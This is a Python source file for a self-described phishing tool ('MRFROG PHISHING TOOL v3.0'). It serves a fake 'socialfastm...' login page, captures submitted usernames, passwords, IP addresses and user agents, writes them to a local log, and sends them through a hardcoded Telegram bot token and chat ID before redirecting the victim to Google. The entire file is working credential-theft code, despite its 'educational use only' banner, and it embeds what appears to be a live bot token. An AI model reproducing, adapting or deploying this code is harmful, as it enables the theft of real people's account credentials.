import os
import sys
import time
import json
import requests
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== CONFIG =====
PORT = 8080
LOG_FILE = "credentials.txt"
TELEGRAM_BOT_TOKEN = "8944122260:AAHqcA2EOzBfaYUcvHjIvKHnkfoGug5VWRg"
TELEGRAM_CHAT_ID = "8594080672"

# ===== EMBEDDED HTML =====
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>socialfastm...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .header {
            margin-bottom: 40px;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 500;
            color: #1a1a1a;
            letter-spacing: -0.3px;
        }
        .header .sub {
            font-size: 16px;
            color: #777;
            margin-top: 4px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #d0d0d0;
            border-radius: 8px;
            background: #fafafa;
            outline: none;
            color: #1a1a1a;
            transition: border 0.2s;
        }
        .form-group input:focus {
            border-color: #2b7aff;
            background: #ffffff;
        }
        .form-group input::placeholder {
            color: #aaa;
            font-weight: 300;
        }
        .btn-signin {
            width: 100%;
            padding: 14px;
            font-size: 17px;
            font-weight: 600;
            color: #ffffff;
            background: #2b7aff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }
        .btn-signin:hover {
            background: #1a5fcc;
        }
        .footer {
            margin-top: 24px;
            font-size: 14px;
            color: #888;
        }
        .footer a {
            color: #2b7aff;
            text-decoration: none;
            font-weight: 500;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer span {
            margin: 0 6px;
            color: #ccc;
        }
        @media (max-width: 480px) {
            .container {
                max-width: 100%;
                padding: 0 8px;
            }
            .header h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>socialfastm...</h1>
            <div class="sub">@fastmm.com</div>
        </div>
        <form id="loginForm" action="/login.php" method="POST">
            <div class="form-group">
                <input type="text" id="username" name="username" placeholder="Username" autocomplete="username" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
            </div>
            <button type="submit" class="btn-signin" id="signinBtn">Sign in</button>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a>
            <span>&middot;</span>
            <a href="#">Create account</a>
        </div>
    </div>
    <script>
        (function() {
            'use strict';
            const form = document.getElementById('loginForm');
            const btn = document.getElementById('signinBtn');
            form.addEventListener('submit', function(e) {
                const username = document.getElementById('username').value.trim();
                const password = document.getElementById('password').value.trim();
                if (!username || !password) {
                    e.preventDefault();
                    alert('Please fill in both fields.');
                    return;
                }
                btn.disabled = true;
                btn.textContent = 'Signing in...';
                setTimeout(function() {
                    btn.disabled = false;
                    btn.textContent = 'Sign in';
                }, 3000);
            });
        })();
    </script>
</body>
</html>"""

# ===== COLORS =====
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# ===== BANNER =====
def show_banner():
    banner = f"""
{CYAN}
┌──────────────────────────────────────┐
│   ___  ___  _____  ___   ___  ___   │
│  |  _ \|  _||  ___/ _ \ |  \/  |   │
│  | |_) | |  | |_  / /_\ \| .  . |   │
│  |  _ <| |  |  _| |  _  || |\/| |   │
│  | |_) | |_ | |   | | | || |  | |   │
│  |____/|___||_|   |_| |_||_|  |_|   │
│                                      │
│     MRFROG PHISHING TOOL v3.0        │
│     AUTHOR: MRFROG                   │
│     TELEGRAM: ENABLED ✅             │
│     HTML: EMBEDDED ✅                │
│     FOR EDUCATIONAL USE ONLY         │
└──────────────────────────────────────┘
{RESET}
"""
    print(banner)

# ===== TELEGRAM SENDER =====
def send_to_telegram(username, password, ip, user_agent):
    try:
        msg = f"🔐 New Login Credentials\n"
        msg += f"👤 Username: {username}\n"
        msg += f"🔑 Password: {password}\n"
        msg += f"🌐 IP: {ip}\n"
        msg += f"📱 UA: {user_agent}\n"
        msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg
        }
        response = requests.get(url, params=params, timeout=5)
        if response.status_code == 200:
            print(f"{GREEN}[+] Sent to Telegram ✅{RESET}")
        else:
            print(f"{RED}[!] Telegram send failed: {response.text}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Telegram error: {e}{RESET}")

# ===== HTTP REQUEST HANDLER =====
class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
    
    def do_POST(self):
        if self.path == "/login.php":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode("utf-8")
            
            params = {}
            for item in post_data.split("&"):
                if "=" in item:
                    key, value = item.split("=", 1)
                    params[key] = value.replace("+", " ")
            
            username = params.get("username", "").strip()
            password = params.get("password", "").strip()
            
            if username and password:
                ip = self.client_address[0]
                user_agent = self.headers.get("User-Agent", "Unknown")
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                log_entry = f"[{timestamp}] IP: {ip} | UA: {user_agent} | Username: {username} | Password: {password}\n"
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(log_entry)
                
                send_to_telegram(username, password, ip, user_agent)
                
                print(f"{GREEN}[+] Credential captured!{RESET}")
                print(f"    {YELLOW}Username:{RESET} {username}")
                print(f"    {YELLOW}Password:{RESET} {password}")
                print(f"    {YELLOW}IP:{RESET} {ip}")
                print("-" * 40)
            
            self.send_response(302)
            self.send_header("Location", "https://www.google.com")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")

# ===== START SERVER =====
def start_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), PhishingHandler)
        print(f"{GREEN}[+] Server started on http://localhost:{PORT}{RESET}")
        print(f"{GREEN}[+] Open this URL in browser{RESET}")
        print(f"{GREEN}[+] Telegram notifications: ENABLED ✅{RESET}")
        print(f"{GREEN}[+] HTML: EMBEDDED ✅{RESET}")
        print(f"{GREEN}[+] Ctrl+C to stop{RESET}")
        print("=" * 50)
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Server stopped{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)

# ===== VIEW LOGS =====
def view_logs():
    if os.path.exists(LOG_FILE):
        print(f"{CYAN}========== CREDENTIALS LOG =========={RESET}")
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            print(f.read())
        print(f"{CYAN}======================================{RESET}")
    else:
        print(f"{YELLOW}[!] No logs found{RESET}")

# ===== CLEAR LOGS =====
def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print(f"{GREEN}[+] Logs cleared{RESET}")
    else:
        print(f"{YELLOW}[!] No logs to clear{RESET}")

# ===== MAIN MENU =====
def main():
    show_banner()
    
    print(f"{YELLOW}[+] Testing Telegram connection...{RESET}")
    send_to_telegram("TEST", "TEST", "127.0.0.1", "MRFROG-TOOL")
    print(f"{YELLOW}[+] If you received a message, Telegram is working!{RESET}")
    print("=" * 50)
    
    while True:
        print(f"\n{CYAN}========== MAIN MENU =========={RESET}")
        print(f"{GREEN}1{RESET}. Start Phishing Server")
        print(f"{GREEN}2{RESET}. View Captured Logs")
        print(f"{GREEN}3{RESET}. Clear Logs")
        print(f"{GREEN}4{RESET}. Exit")
        print(f"{CYAN}==============================={RESET}")
        
        choice = input(f"{YELLOW}[?] Choose: {RESET}").strip()
        
        if choice == "1":
            print(f"{GREEN}[+] Starting server...{RESET}")
            start_server()
        
        elif choice == "2":
            view_logs()
        
        elif choice == "3":
            clear_logs()
        
        elif choice == "4":
            print(f"{YELLOW}[!] Exiting...{RESET}")
            sys.exit(0)
        
        else:
            print(f"{RED}[!] Invalid choice{RESET}")

if __name__ == "__main__":
    main()